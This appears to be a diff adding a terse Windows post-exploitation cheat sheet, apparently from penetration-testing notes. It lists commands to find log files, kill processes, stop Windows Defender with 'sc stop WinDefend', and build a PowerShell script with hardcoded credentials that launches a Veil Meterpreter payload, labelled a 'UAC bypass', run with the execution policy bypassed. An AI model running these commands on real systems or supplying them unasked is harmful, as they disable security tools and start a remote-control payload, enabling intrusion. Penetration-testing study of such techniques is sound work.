@@ -1,1 +1,19 @@
+Find log files in directory
+   •  dir /s *log* 
 
+Process
+   • tasklist
+   • taskkill /F /PID pid_number
+
+
+Disable windows defender:
+   •  sc stop WinDefend
+
+
+UAC bypass:
+   •  echo $username = "alice" > run.ps1
+   •  echo $secpasswd = ConvertTo-SecureString "aliceishere" -AsPlainText -Force >> run.ps1
+     echo $mycreds = New-Object System.Management.Automation.PSCredential ("$username",$secpasswd) >> run.ps1
+   •  echo Start-Process veil_meterpreter.bat  -Credential ($mycreds) >> run.ps1
+
+   • powershell -ExecutionPolicy Bypass -File run.ps1 
